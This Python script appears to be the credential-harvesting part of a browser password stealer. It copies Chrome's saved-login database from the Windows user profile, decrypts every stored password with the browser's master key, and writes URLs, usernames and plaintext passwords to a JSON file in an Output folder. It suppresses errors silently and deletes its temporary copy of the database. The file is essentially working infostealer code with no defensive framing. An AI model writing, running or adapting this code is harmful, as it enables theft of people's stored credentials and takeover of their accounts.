import os
import json
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

from utils.decrypt import get_master_key, decrypt_password

passwords = []
master_key = get_master_key()
login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'

#making a temp copy since Login Data DB is locked while Chrome is running
shutil.copy2(login_db, "Login_temp.db")
conn = sqlite3.connect("Login_temp.db")
cursor = conn.cursor()

def get_passwords():
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            d = {}
            d['url'] = r[0]
            d['username'] = r[1]
            encrypted_password = r[2]
            d['decrypted_password'] = decrypt_password(encrypted_password, master_key)
            passwords.append(d)

        json_data = json.dumps(passwords)

        filename = "./Output/password.json"
        os.makedirs(os.path.dirname(filename), exist_ok=True)

        with open(filename, 'w') as f:
            f.write(json_data)

    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Login_temp.db")
    except Exception as e:
        pass
        